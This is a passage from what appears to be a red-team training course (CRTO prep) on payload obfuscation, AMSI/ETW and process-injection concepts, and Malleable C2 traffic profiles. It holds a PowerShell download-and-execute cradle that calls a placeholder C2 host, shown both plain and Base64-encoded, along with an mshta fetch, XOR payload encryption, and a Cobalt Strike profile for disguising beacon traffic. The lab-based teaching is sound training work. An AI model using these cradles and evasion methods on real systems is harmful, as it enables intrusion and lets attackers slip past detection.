heavily monitored.</li>\n<li><strong>Network Traffic Analysis:</strong> C2 communication often has patterns (specific headers, timings, domain names, encryption ciphers) that don&#39;t look like normal user traffic. (We touched on this with Malleable C2 in Module 7, but the concept applies here too).</li>\n</ol>\n<p>Our goal in this module is to introduce techniques that make our payloads and execution methods less noisy or detectable across some of these vectors, focusing initially on File/Memory (basic) and Command Line.</p>\n<h4>6.2 Basic Payload Obfuscation Techniques</h4>\n<p>Obfuscation is about making something harder to understand or analyze, both for humans and for automated tools. We&#39;re not aiming for perfect stealth yet, just making the <em>initial</em> detection harder.</p>\n<p><strong>6.2.1 Simple Encoding (Base64, Hex)</strong></p>\n<p>Encoding converts data into a different format using a public standard. It&#39;s <em>not</em> encryption (it doesn&#39;t use a secret key). Anyone can decode it.</p>\n<ul>\n<li><strong>Why use it?</strong> It changes the raw bytes of your payload or command, potentially bypassing simple signature checks that look for specific byte sequences. It also makes command lines look less immediately readable, sometimes fooling naive monitoring that doesn&#39;t automatically decode.</li>\n<li><strong>Limitations:</strong> It&#39;s easily decoded by security tools and analysts. It doesn&#39;t change the <em>behavior</em> of the code once executed. Base64 encoding actually makes the data <em>larger</em>, which can sometimes be suspicious in itself.</li>\n</ul>\n<p><strong>Example: Encoding a PowerShell Command</strong></p>\n<p>Let&#39;s say our payload execution command involves a simple PowerShell script block:</p>\n<pre><code class=\"language-powershell\">IEX (New-Object Net.WebClient).DownloadString(&#39;http://your.c2.com/payload.ps1&#39;)\n</code></pre>\n<p>This string <code>New-Object Net.WebClient</code> is very common and might be flagged. We can encode the <em>entire command block</em> (<code>IEX ... payload.ps1</code>) using Base64.</p>\n<ol>\n<li><strong>Get the bytes:</strong> Convert the string to UTF-16 Little Endian bytes (required for PowerShell&#39;s <code>-EncodedCommand</code>).</li>\n<li><strong>Base64 Encode:</strong> Encode the bytes into a Base64 string.</li>\n</ol>\n<p><strong>Python Example:</strong></p>\n<pre><code class=\"language-python\">import base64\nimport sys\n\ncommand = &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://your.c2.com/payload.ps1&#39;)&quot;\n\n# PowerShell -EncodedCommand requires UTF-16 Little Endian\ncommand_bytes = command.encode(&#39;utf-16le&#39;)\n\n# Base64 Encode\nencoded_command = base64.b64encode(command_bytes).decode(&#39;ascii&#39;)\n\nprint(f&quot;Original Command: {command}&quot;)\nprint(f&quot;Base64 Encoded: {encoded_command}&quot;)\n\n# How you&#39;d execute this in PowerShell:\n# powershell.exe -ExecutionPolicy Bypass -NoProfile -EncodedCommand &lt;encoded_command_output&gt;\n</code></pre>\n<ul>\n<li><strong>Output:</strong><pre><code>Original Command: IEX (New-Object Net.WebClient).DownloadString(&#39;http://your.c2.com/payload.ps1&#39;)\nBase64 Encoded: SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAJACcAaAB0AHQAcAA6AC8ALwB5AG8AdQByAC4AYwAyAC4AYwBvAG0ALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApAAoA\n</code></pre>\n</li>\n</ul>\n<p>Now, instead of executing the original command directly, you&#39;d use:</p>\n<pre><code class=\"language-powershell\">powershell.exe -ExecutionPolicy Bypass -NoProfile -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAJACcAaAB0AHQAcAA6AC8ALwB5AG8AdQByAC4AYwAyAC4AYwBvAG0ALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApAAoA\n</code></pre>\n<p>This looks like gibberish on the command line, potentially bypassing simple text-based rules. However, EDRs are smart enough to hook <code>powershell.exe</code> and log the <em>decoded</em> command block, and AMSI (discussed next) will scan the decoded script <em>before</em> it runs. So, this is minimal evasion, primarily against simple command line monitoring or static file analysis.</p>\n<p><strong>6.2.2 XOR and Simple Encryption</strong></p>\n<p>XOR (Exclusive OR) is a simple bitwise operation. It&#39;s often used for basic encryption because applying the same key twice reverses the operation (<code>A XOR Key = B</code>, then <code>B XOR Key = A</code>).</p>\n<ul>\n<li><strong>Why use it?</strong> It changes the raw bytes of your payload significantly, making signature detection much harder. The payload on disk or in memory (before decryption) won&#39;t match known bad patterns.</li>\n<li><strong>Limitations:</strong> You need a small &quot;stub&quot; of code (the decoder) that is <em>not</em> XORed to perform the decryption. This stub itself can be detected. The key needs to be embedded somewhere, potentially discoverable. More sophisticated analysis can sometimes identify XORed data by looking at byte frequency distributions.</li>\n</ul>\n<p><strong>Conceptual Example:</strong></p>\n<p>Instead of hosting <code>payload.exe</code>, you XOR <code>payload.exe</code> with a key and host <code>payload.xor</code>. Your launcher code would:</p>\n<ol>\n<li>Download <code>payload.xor</code>.</li>\n<li>Use the hardcoded key to XOR the data back into <code>payload.exe</code> in memory.</li>\n<li>Execute the payload directly from memory (more advanced, related to process injection concepts) or write it to a temporary location and execute (riskier, creates a file on disk).</li>\n</ol>\n<p><strong>Python Example (XORing a simple string):</strong></p>\n<pre><code class=\"language-python\">def xor_encrypt_decrypt(data, key):\n    # Ensure key is bytes\n    key_bytes = key.encode(&#39;utf-8&#39;) if isinstance(key, str) else key\n    # Ensure data is bytes\n    data_bytes = data.encode(&#39;utf-8&#39;) if isinstance(data, str) else data\n\n    key_len = len(key_bytes)\n    encrypted_data = bytearray()\n    for i in range(len(data_bytes)):\n        encrypted_data.append(data_bytes[i] ^ key_bytes[i % key_len])\n    return bytes(encrypted_data)\n\nkey = &quot;mysecretkey&quot;\noriginal_data = &quot;This is a test string for XOR.&quot;\n\n# Encrypt\nencrypted = xor_encrypt_decrypt(original_data, key)\nprint(f&quot;Original: {original_data}&quot;)\nprint(f&quot;Key: {key}&quot;)\nprint(f&quot;Encrypted (bytes): {encrypted}&quot;)\nprint(f&quot;Encrypted (hex): {encrypted.hex()}&quot;) # Often easier to see the bytes\n\n# Decrypt\ndecrypted = xor_encrypt_decrypt(encrypted, key).decode(&#39;utf-8&#39;)\nprint(f&quot;Decrypted: {decrypted}&quot;)\n\n# Example with a small byte array (simulating payload bytes)\npayload_bytes = b&#39;\\x90\\x90\\xCC\\xC3&#39; # Example bytes (NOP, NOP, INT 3, RET)\nkey_bytes = b&#39;\\xAA\\xBB&#39;\nencrypted_payload = xor_encrypt_decrypt(payload_bytes, key_bytes)\nprint(f&quot;Original Payload Bytes: {payload_bytes.hex()}&quot;)\nprint(f&quot;Key Bytes: {key_bytes.hex()}&quot;)\nprint(f&quot;Encrypted Payload Bytes: {encrypted_payload.hex()}&quot;)\ndecrypted_payload = xor_encrypt_decrypt(encrypted_payload, key_bytes)\nprint(f&quot;Decrypted Payload Bytes: {decrypted_payload.hex()}&quot;)\n</code></pre>\n<ul>\n<li><strong>Output Example:</strong><pre><code>Original: This is a test string for XOR.\nKey: mysecretkey\nEncrypted (bytes): b&#39;\\x01\\x0f\\x12\\x10\\x0c\\x0c\\x01\\x12^\\x05\\x1c\\x12\\x06\\x02\\x12\\x0b\\x0c\\x04\\x01^\\x01\\x12\\x10\\x10\\x06\\x17\\x01\\x0c\\x01\\x12\\x10^\\x0b\\x1c\\x0c\\x02\\x02\\x01\\x1f&#39;\nEncrypted (hex): 010f12100c0c01125e051c120602120b0c04015e011210100617010c0112105e0b1c0c0202011f\nDecrypted: This is a test string for XOR.\nOriginal Payload Bytes: 9090ccc3\nKey Bytes: aabb\nEncrypted Payload Bytes: 3a3a6668\nDecrypted Payload Bytes: 9090ccc3\n</code></pre>\n</li>\n</ul>\n<p>Notice how the encrypted bytes are completely different from the original. This is the core idea behind bypassing signature-based detection on the raw payload file.</p>\n<p><strong>6.2.3 String Obfuscation within Code/Scripts</strong></p>\n<p>Instead of having obvious strings like <code>&quot;C:\\\\Users\\\\Public\\\\payload.exe&quot;</code> or <code>&quot;New-Object Net.WebClient&quot;</code> directly in your script, you can build them dynamically or hide them.</p>\n<ul>\n<li><strong>Why use it?</strong> Bypasses simple static analysis of scripts or code that looks for specific literal strings.</li>\n<li><strong>Limitations:</strong> More complex analysis can often follow the logic and reconstruct the strings. Doesn&#39;t help if the <em>behavior</em> is detected.</li>\n</ul>\n<p><strong>PowerShell Example:</strong></p>\n<p>Instead of:</p>\n<pre><code class=\"language-powershell\">$path = &quot;C:\\Temp\\malware.exe&quot;\nStart-Process $path\n</code></pre>\n<p>You could do:</p>\n<pre><code class=\"language-powershell\">$p = &quot;C:\\Te&quot;; $p += &quot;mp\\&quot;; $p += &quot;malware.exe&quot;;\nStart-Process $p\n</code></pre>\n<p>Or even more complex:</p>\n<pre><code class=\"language-powershell\">$chars = @(67, 58, 92, 84, 101, 109, 112, 92, 109, 97, 108, 119, 97, 114, 101, 46, 101, 120, 101) # ASCII values\n$path = [System.Text.Encoding]::ASCII.GetString($chars)\nStart-Process $path\n</code></pre>\n<p>This makes it harder for a simple regex or string scan to spot the malicious path.</p>\n<h4>6.3 Brief Dive into Advanced Concepts (High-Level)</h4>\n<p>The CRTO focuses on practical foundational skills. While AMSI, ETW, and Process Injection are key evasion techniques, for this module, we&#39;ll cover their <em>purpose</em> and <em>concept</em> at a high level as they relate to detection and evasion, rather than diving into complex implementation details.</p>\n<p><strong>6.3.1 Introduction to AMSI (Antimalware Scan Interface)</strong></p>\n<ul>\n<li><strong>What it is:</strong> AMSI is a Windows feature designed to allow applications (like PowerShell, WMI, JScript, VBScript, .NET) to pass their script/code content to the installed Antivirus/EDR <em>before</em> it gets executed by the application.</li>\n<li><strong>How it works:</strong> When a script is about to run, or a script block is evaluated, the application sends the <em>unobfuscated</em> content to the AMSI provider (your AV/EDR). The AV/EDR scans it in real-time. If it detects something malicious (even if it was heavily obfuscated in the original file/command), it tells the application to stop execution.</li>\n<li><strong>Why it matters for evasion:</strong> AMSI defeats many simple string obfuscation and encoding techniques <em>for scripting languages</em>, because it scans the <em>decoded, deobfuscated</em> content.</li>\n<li><strong>Bypass Concepts (High-Level):</strong> Bypassing AMSI typically involves finding ways to interfere with the AMSI scanning process <em>in memory</em> before your malicious code is sent to it. This often involves reflecting on the <code>Amsi.dll</code> in memory and patching functions or manipulating its state. <em>This is a more advanced technique and beyond the scope of foundational implementation here, but understand its purpose.</em></li>\n</ul>\n<p><strong>6.3.2 Introduction to ETW (Event Tracing for Windows)</strong></p>\n<ul>\n<li><strong>What it is:</strong> ETW is a high-performance, kernel-level tracing facility built into Windows. It&#39;s used by many system components and applications to log detailed events.</li>\n<li><strong>How it works:</strong> Security products, especially EDRs, are major consumers of ETW events. They subscribe to specific ETW providers (like the Microsoft-Windows-Threat-Intelligence provider, or providers related to PowerShell, .NET, etc.) to get rich telemetry about what&#39;s happening on the system – process creation details, command lines, network connections, loaded modules, registry changes, and even details about API calls.</li>\n<li><strong>Why it matters for evasion:</strong> EDRs build their behavioral detection and threat hunting capabilities on top of this detailed ETW data. If your actions generate specific sequences of ETW events that look malicious, you&#39;ll get caught.</li>\n<li><strong>Bypass Concepts (High-Level):</strong> Bypassing ETW often involves patching functions that write events to ETW buffers <em>in memory</em> within your process or the process you inject into. This prevents the telemetry from ever reaching the EDR. <em>Again, this is an advanced technique, but understand that EDRs rely heavily on this low-level tracing.</em></li>\n</ul>\n<p><strong>6.3.3 Understanding Process Injection (Basics)</strong></p>\n<ul>\n<li><strong>What it is:</strong> Process injection is a technique where you execute arbitrary code within the address space of another process.</li>\n<li><strong>Why it&#39;s used for evasion:</strong> The primary goal is to hide your malicious activity within a legitimate, trusted process (like <code>explorer.exe</code>, <code>svchost.exe</code>, <code>notepad.exe</code>). If the malicious code runs under the guise of a trusted process, it can potentially evade defenses that monitor <em>your</em> initial malicious process or block untrusted executables.</li>\n<li><strong>Common Techniques Overview (Concept &amp; Purpose):</strong><ul>\n<li><strong>Remote Threads:</strong> Allocate memory in a target process, write your malicious code (shellcode) there, and create a new thread in the target process to start executing your code.</li>\n<li><strong>APC (Asynchronous Procedure Call):</strong> Queue a function call (pointing to your shellcode) to be executed by an <em>existing</em> thread in the target process when that thread enters an alertable state.</li>\n<li><strong>Process Hollowing:</strong> Create a new instance of a legitimate process in a suspended state, unmap its original code, write your malicious code into its memory space, change its context to point to your code, and resume the thread.</li>\n</ul>\n</li>\n<li><strong>How it relates to evasion:</strong> By running your payload (like a C2 implant) inside <code>explorer.exe</code>, network connections originating from <code>explorer.exe</code> might look less suspicious than if they came from <code>my_malware.exe</code>. API calls made by your code are attributed to the target process. <em>Implementing process injection is typically beyond foundational CRTO, but understanding <em>that</em> it&#39;s an evasion technique and <em>why</em> (blending into trusted processes) is important.</em></li>\n</ul>\n<h4>6.4 Testing Payloads Against Basic Controls</h4>\n<p>How do you know if your evasion worked? You test!</p>\n<ul>\n<li><strong>Using a Lab AV Instance:</strong> If you installed a test Antivirus on your lab workstation (Module 2), you can try dropping your obfuscated payload file onto the desktop or executing your obfuscated command. Does the AV flag it? Observe the pop-ups or the AV logs.</li>\n<li><strong>Using Public Scanners (VirusTotal - CAREFULLY!):</strong> VirusTotal scans files with dozens of AV engines. It also shows you strings, imports, and behavioral information observed during sandboxed execution.<ul>\n<li><strong>CAUTION:</strong> <em>Never</em> upload a payload you intend to use in a real engagement or a novel technique to VirusTotal. Uploading shares the file with all vendors and the community. This is only suitable for testing <em>publicly available</em> tools/payloads or extremely simple, non-sensitive test files (like a basic <code>calc.exe</code> launcher you wrote yourself).</li>\n<li><strong>How to use:</strong> Upload your obfuscated payload file. Look at the &quot;Detection&quot; tab. Look at the &quot;Behavioral&quot; tab to see what processes were spawned, what files were touched, what network connections were attempted. This gives you insight into what <em>behavioral</em> detection might catch.</li>\n</ul>\n</li>\n</ul>\n<p>The goal is to get a feel for how readily your techniques are flagged and where defenders might see your activity.</p>\n<h4>6.5 Module Project/Exercise Deep Dive: Project 6.1 - Obfuscate and Re-execute</h4>\n<p>Alright, hands back on the keyboard! This project is about taking what we built in Modules 4 and 5 and adding that crucial first layer of evasion.</p>\n<p><strong>Project 6.1: Obfuscate and Re-execute</strong></p>\n<p><strong>Objective:</strong> Apply a simple obfuscation technique to your payload or execution command and observe its effect on detection and logging compared to the original.</p>\n<p><strong>Steps:</strong></p>\n<ol>\n<li><strong>Identify Your Target (Payload/Command):</strong> Go back to your successful Module 5 execution. What was the exact command line you ran on the target workstation? What was the payload file (if any) you hosted and executed? <em>Example: Maybe you used <code>mshta http://your.c2.com/payload.hta</code> or <code>powershell -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://your.c2.com/payload.ps1&#39;)&quot;</code>.</em></li>\n<li><strong>Choose an Obfuscation Technique:</strong> Select <em>one</em> simple technique from Section 6.2 to apply.<ul>\n<li><strong>Option A (Command Line Encoding):</strong> If your execution involved a script interpreter (<code>powershell</code>, <code>cscript</code>, <code>wscript</code>, <code>mshta</code> with script inside), encode the script block or command string using Base64 (like the PowerShell example in 6.2.1).</li>\n<li><strong>Option B (Simple File Obfuscation):</strong> If you were executing a small file (like a <code>.ps1</code> script or a simple executable stub), try applying a simple XOR (conceptually, you don&#39;t need to build a full XOR loader, just understand the file bytes would change). <em>For practical purposes in this lab, encoding a command line is often easier to demonstrate.</em></li>\n<li><strong>Option C (String Obfuscation in Script):</strong> If your payload was a script, modify it to obfuscate a key string (like a file path or a URL) using concatenation or another simple method (like the PowerShell example in 6.2.3).</li>\n</ul>\n</li>\n<li><strong>Apply the Obfuscation:</strong><ul>\n<li><strong>If encoding a command line:</strong> Take the script/command string, encode it (e.g., using the Python script from 6.2.1 for PowerShell), and construct the new execution command (<code>powershell -enc ...</code>).</li>\n<li><strong>If modifying a script payload:</strong> Edit your script file (e.g., <code>payload.ps1</code>, <code>payload.hta</code>) to obfuscate a string within it. Host the <em>obfuscated</em> version on your web server (Module 3).</li>\n</ul>\n</li>\n<li><strong>Update Hosting (If necessary):</strong> If you modified a payload file (Option B or C), ensure the obfuscated version is now hosted on your web server configured in Module 3. If you just changed the command line (Option A), you might not need to change the hosted file itself, just the command you run.</li>\n<li><strong>Execute the Obfuscated Payload/Command:</strong> Go back to your target workstation VM in the lab (Module 2). Execute the <em>new</em>, obfuscated command line or trigger the execution of the obfuscated payload file (e.g., browse to the updated HTA file, run the new PowerShell command).</li>\n<li><strong>Verify Execution &amp; Callback:</strong> Does it still work? Do you get a callback in your C2 framework (even if it&#39;s just a simple connect-back)? If not, troubleshoot your obfuscation or the execution command.</li>\n<li><strong>Analyze the Logs (SIEM - Module 2):</strong> This is a critical step!<ul>\n<li>Connect to your Splunk Free or ELK instance.</li>\n<li>Search for events related to the execution <em>after</em> you applied obfuscation. Look for:<ul>\n<li>Process Creation events (Sysmon Event ID 1, Security Event ID 4688): How does the command line look now? Is the original command visible or is it encoded/obfuscated?</li>\n<li>Network Connection events (Sysmon Event ID 3): Do you see the outbound connection to your C2 redirector? Does it look the same as before?</li>\n</ul>\n</li>\n<li>Compare these logs side-by-side with the logs you collected from the <em>original</em>, non-obfuscated execution in Module 5. What are the differences in visibility? Did the obfuscation hide the command line arguments? Did it change how the process was logged?</li>\n</ul>\n</li>\n<li><strong>Observe AV (If applicable):</strong> If you have a test AV installed, did it detect the obfuscated payload/command? Did it detect the original? Note any differences.</li>\n<li><strong>Document Your Findings:</strong> Briefly summarize:<ul>\n<li>The original payload/command.</li>\n<li>The obfuscation technique you applied.</li>\n<li>The new obfuscated command/payload.</li>\n<li>Whether execution/callback was successful.</li>\n<li>What you observed in the SIEM logs (how did the obfuscation change the log entries for execution and network connection?).</li>\n<li>Any differences in AV detection (if tested).</li>\n</ul>\n</li>\n</ol>\n<p>This project directly builds on Module 5, adding the layer of evasion. You&#39;re seeing firsthand how a simple change can affect detection visibility in your lab environment.</p>\n<p><strong>Contribution to Capstone:</strong> This project adds the crucial <em>evasion</em> layer, making the initial access technique more realistic and resilient against basic defenses. It directly modifies the execution phase components (payload and command) built in prior modules and uses the monitoring infrastructure from Module 2 to evaluate effectiveness.</p>\n<hr>\n<h3>Conclusion</h3>\n<p>Fantastic work, team! You&#39;ve now taken your first steps into the world of evasion. You understand that security tools look for patterns – in files, in memory, in command lines, and in behavior. And you&#39;ve applied basic techniques like encoding and string obfuscation to change those patterns and make your activity less conspicuous.</p>\n<p>We also got a high-level glimpse into more advanced concepts like AMSI, ETW, and Process Injection, understanding <em>why</em> they exist and <em>what</em> they aim to detect or evade. While we didn&#39;t implement complex bypasses, knowing <em>what</em> defenders are using helps us think about future, more sophisticated evasion strategies.</p>\n<p>Your Project 6.1 is a real demonstration of this. You&#39;ve modified your attack chain and, critically, used your monitoring lab to see the impact. This feedback loop – attack, detect, analyze, evade – is the core rhythm of adversary simulation.</p>\n<p>We&#39;ve now got a basic, slightly stealthier initial access method. Next up, we&#39;ll look at how to manage our implants effectively using malleable profiles, giving us more control and helping us blend in further over the network.</p>\n<p>Keep building, keep experimenting, and keep asking &quot;how would a defender see this?&quot; That mindset is your most powerful tool!</p>\n\n                </div>\n             </div>\n         ",
    "module-7": "\n             <div class=\"card main-content-card\"> <!-- Added main-content-card class -->\n                <h1>Module 7: module_7</h1> <!-- Use module title here -->\n                <div class=\"markdown-content\">\n                    <p>Alright team, settle in! This is where we start adding some serious stealth to our operation. We&#39;ve built our lab, set up our basic comms, crafted a payload, and even got it to execute and call back. Fantastic progress! But let&#39;s be real: a default connection from a generic implant is <em>screaming</em> &quot;malicious!&quot; to any decent security tool watching the network.</p>\n<p>This module, <strong>Module 7: Implant Management with Malleable C2</strong>, is all about making our implants blend in. We&#39;re going to learn how to shape our command and control traffic so it looks less like a threat actor and more like… well, whatever we want it to look like. This is a critical layer of operational security (OpSec) for any serious simulation. We&#39;re not just getting in; we&#39;re learning how to <em>stay</em> connected without immediately triggering alarms.</p>\n<hr>\n<h2>CRTO Prep Part 1: Adversary Simulation Foundations</h2>\n<h3>Module 7: Implant Management with Malleable C2</h3>\n<ul>\n<li><strong>Module Objective:</strong> By the end of this module, learners will understand the importance of C2 profile malleability and be able to configure basic options to control implant behavior and blend in with legitimate network traffic.</li>\n</ul>\n<hr>\n<h4>7.1 The Need for Malleable C2 Profiles: Blending In</h4>\n<p><strong>Why Default C2 is Loud:</strong></p>\n<p>Imagine you have a piece of malware that calls home every 5 seconds, always using the same, unique User-Agent string (&quot;MySuperMalware 1.0&quot;), sending data in a fixed, unusual pattern, and connecting to an IP address with no associated DNS name. How long do you think that would go unnoticed by network monitoring tools, intrusion detection systems (IDS), or even just a sharp analyst looking at logs? Not long at all!</p>\n<p>Security tools and analysts look for <em>anomalies</em> and <em>signatures</em>.</p>\n<ul>\n<li><strong>Signatures:</strong> Specific byte patterns in network traffic, unique combinations of HTTP headers, known malicious domains or IPs.</li>\n<li><strong>Anomalies:</strong> Unusual connection patterns (frequency, size, destination), traffic that doesn&#39;t look like standard applications (web browsing, email, updates).</li>\n</ul>\n<p>Default C2 frameworks often have recognizable patterns. Their implants might use default User-Agents, fixed URIs (the path in a web request, like <code>/submit.php</code>), predictable check-in intervals, and distinct data encoding/encryption methods. These defaults become signatures that defenders can write rules for.</p>\n<p><strong>Enter Malleable C2:</strong></p>\n<p>Malleable C2 (or sometimes called &quot;C2 profiles&quot; or &quot;traffic shapers&quot;) is the answer. It&#39;s the ability to customize the <em>appearance</em> and <em>behavior</em> of your implant&#39;s communication traffic. Instead of being stuck with a loud, distinct signature, you can mold your traffic to look like something else – legitimate web browsing, a software update, a specific application&#39;s traffic, or anything else you can define.</p>\n<p><strong>The Goal:</strong> Blend in with the noise. Make your malicious traffic indistinguishable (or at least very difficult to distinguish) from the normal, expected network activity in the target environment. This significantly increases the time before detection (dwell time) and makes the defender&#39;s job much harder.</p>\n<h4>7.2 Introduction to Malleable C2 Profile Concepts</h4>\n<p>Okay, so how do we achieve this blending? Malleable C2 frameworks use <em>profiles</em> – configuration files that dictate exactly how the implant (often called a &quot;beacon&quot; or &quot;agent&quot;) communicates with the C2 server or redirector.</p>\n<p>Think of it like a script or a set of instructions for the implant&#39;s network stack:</p>\n<ul>\n<li>&quot;When you check in, use this specific User-Agent string.&quot;</li>\n<li>&quot;Request this URL path.&quot;</li>\n<li>&quot;Add these specific HTTP headers.&quot;</li>\n<li>&quot;Encrypt/encode the data this way before sending it.&quot;</li>\n<li>&quot;Wait this long before the next check-in, but add some randomness.&quot;</li>\n</ul>\n<p><strong>Frameworks and Profiles:</strong></p>\n<p>While the concepts are universal, the syntax and capabilities vary between C2 frameworks.</p>\n<ul>\n<li><strong>Cobalt Strike:</strong> Has a well-known and powerful malleable C2 profile language. This is often the <em>de facto</em> standard used for teaching and examples because its profiles are human-readable and demonstrate the core concepts clearly. We will use Cobalt Strike&#39;s syntax to illustrate the <em>concepts</em> in this module.</li>\n<li><strong>Mythic:</strong> Uses profiles defined in Python, offering great flexibility.</li>\n<li><strong>Sliver:</strong> Uses profiles defined in a human-readable text format, similar in concept to Cobalt Strike.</li>\n<li><strong>Metasploit (limited):</strong> While you can configure some aspects like User-Agent, it lacks the deep malleability of dedicated C2 frameworks.</li>\n</ul>\n<p><strong>Key Takeaway:</strong> You don&#39;t need to <em>own</em> Cobalt Strike to understand malleable profiles. The core concepts are what matter, and you can learn them by studying sample profiles and understanding the different configuration options, which are often replicated (with different syntax) in open-source alternatives.</p>\n<p>A profile typically defines two main things:</p>\n<ol>\n<li><strong>How the implant makes requests (HTTP GET/POST):</strong> What the outgoing traffic looks like.</li>\n<li><strong>How the C2 server responds:</strong> What the incoming traffic (commands, tasks, data) looks like when sent back to the implant.</li>\n</ol>\n<p>By controlling both sides, you can make the communication look like a standard client-server interaction (e.g., a web browser requesting a page, or a software client checking for updates).</p>\n<h4>7.3 Configuring Basic HTTP/S Options</h4>\n<p>This is where we get specific with <em>what</em> we can control in the profile to make our HTTP/S traffic look legitimate. We&#39;ll use simplified examples based on Cobalt Strike&#39;s profile language structure.</p>\n<p>A profile often has blocks for <code>http-get</code> (implant checking in, getting tasks) and <code>http-post</code> (implant sending data, results). Within these blocks, you define the request and response.</p>\n<pre><code># Example (Simplified Cobalt Strike Syntax)\n\nhttp-get {\n    set uri &quot;/news/feed.php&quot;; # What URL path does the implant request?\n\n    client {\n        # How the implant&#39;s request looks\n        header &quot;User-Agent&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36&quot;; # Standard Chrome UA\n        header &quot;Accept&quot; &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;;\n        header &quot;Referer&quot; &quot;https://www.google.com/&quot;; # Make it look like they clicked from Google\n        header &quot;Host&quot; &quot;update.legit-software.com&quot;; # Specify the Host header (crucial for redirectors/domain fronting)\n\n        metadata {\n            # How implant metadata (session ID, etc.) is sent in the request\n            base64; # Encode metadata with base64\n            header &quot;Cookie&quot;; # Send metadata in a Cookie header\n        }\n    }\n\n    server {\n        # How the C2 server&#39;s response looks\n        header &quot;Server&quot; &quot;Apache&quot;; # Look like a standard web server\n        header &quot;Content-Type&quot; &quot;text/html; charset=utf-8&quot;;\n\n        output {\n            # How tasks/commands are sent back to the implant\n            base64; # Encode output with base64\n            print; # Print the encoded data directly in the response body\n        }\n    }\n}\n\nhttp-post {\n    set uri &quot;/process/data.php&quot;; # What URL path does the implant post to?\n\n    client {\n        # How the implant&#39;s request looks when sending data\n        header &quot;User-Agent&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36&quot;;\n        header &quot;Content-Type&quot; &quot;application/x-www-form-urlencoded&quot;; # Look like a form submission\n\n        id {\n             # How the implant&#39;s session ID is sent in the post request\n             parameter &quot;session&quot;; # Send session ID as a URL parameter: /process/data.php?session=...\n         }\n\n        output {\n            # How the implant sends task results/data\n            base64; # Encode output with base64\n            parameter &quot;data&quot;; # Send encoded data as a URL parameter: /process/data.php?session=...&amp;data=...\n        }\n    }\n\n    server {\n        # How the C2 server responds after receiving data (often just a simple 200 OK)\n        header &quot;Server&quot; &quot;Apache&quot;;\n        header &quot;Content-Type&quot; &quot;text/html; charset=utf-8&quot;;\n        print &quot;OK&quot;; # Simple response body\n    }\n}\n</code></pre>\n<p>Let&#39;s break down the key parts relevant to basic configuration:</p>\n<ul>\n<li><strong><code>set uri</code>:</strong> Defines the path the implant will request or post to. Choose paths that look normal (e.g., <code>/updates</code>, <code>/api/v1/status</code>, <code>/images/load</code>). Avoid suspicious paths like <code>/beacon</code> or <code>/data</code>.</li>\n<li><strong><code>header &quot;[Header-Name]&quot; &quot;[Value]&quot;</code>:</strong> Allows setting arbitrary HTTP headers. This is crucial.<ul>\n<li><strong><code>User-Agent</code>:</strong> A string identifying the client software. Mimic common browsers (<code>Mozilla/... Chrome/...</code>), common applications (<code>Microsoft-WNS/...</code>), or update clients. <em>Never</em> use a default or obviously malicious User-Agent.</li>\n<li><strong><code>Host</code>:</strong> The domain name the client is requesting. This is vital if you&#39;re using redirectors or domain fronting, as it tells the server which site you&#39;re trying to reach.</li>\n<li><strong><code>Referer</code>:</strong> The URL of the page that linked to the current request. Can be set to make it look like the request came from a legitimate source (e.g., Google, a corporate portal).</li>\n<li><strong><code>Cookie</code>:</strong> Used for session tracking on websites. Can be abused to send implant metadata or even data.</li>\n<li><strong><code>Accept</code>, <code>Accept-Language</code>, etc.:</strong> Standard browser headers that make the request look normal.</li>\n<li><strong>Custom Headers:</strong> You can define your own headers, but be careful they don&#39;t stand out.</li>\n</ul>\n</li>\n<li><strong>Metadata/ID/Output:</strong> These sections define <em>how</em> the implant sends its session ID, initial metadata, and subsequent task output back to the C2.<ul>\n<li><code>base64</code>, <code>base64url</code>, <code>hex</code>: Common encodings to make the data look less like raw shellcode/output.</li>\n<li><code>header</code>, <code>parameter</code>, <code>uri</code>, <code>print</code>: Define <em>where</em> in the request (header, URL parameter, URI path itself) or response (body via <code>print</code>) the encoded data is placed.</li>\n<li><strong>OpSec Note:</strong> Avoid putting sensitive data directly in the URI path or parameters if it&#39;s easily visible in proxies or logs. Headers or encrypted body data are generally stealthier.</li>\n</ul>\n</li>\n</ul>\n<p><strong>Practical Tip:</strong> Look at the HTTP traffic generated by legitimate applications in your target environment using a tool like Burp Suite or Fiddler (if you were doing a real assessment) or just by browsing common websites with your browser&#39;s developer tools. Copy those headers, URIs, and patterns!</p>\n<h4>7.4 Configuring Communication Timings</h4>\n<p>The <em>frequency</em> and <em>predictability</em> of communication are major detection vectors.</p>\n<ul>\n<li>A beacon checking in exactly every 5 seconds is highly suspicious. Legitimate traffic is usually bursty and unpredictable.</li>\n<li>Very frequent check-ins (e.g., &lt; 1 second) are also suspicious and noisy.</li>\n</ul>\n<p>Malleable profiles allow you to control this:</p>\n<ul>\n<li><p><strong><code>sleep</code>:</strong> This sets the base time (in seconds, minutes, etc.) the implant waits between checking in. A longer sleep is stealthier but means slower response times for you.</p>\n<pre><code>set sleep &quot;30s&quot;; # Wait 30 seconds between check-ins\n</code></pre>\n</li>\n<li><p><strong><code>jitter</code>:</strong> This is <em>crucial</em> for breaking predictability. Jitter adds a random percentage <em>variation</em> to the sleep time.</p>\n<pre><code>set jitter &quot;20&quot;; # Add +/- 20% randomness to the sleep time\n</code></pre>\n<p>If <code>sleep</code> is 30 seconds and <code>jitter</code> is 20%, the actual sleep time will be randomly chosen between <code>30 * (1 - 0.20)</code> and <code>30 * (1 + 0.20)</code>, which is between 24 seconds and 36 seconds. This makes timing analysis much harder for 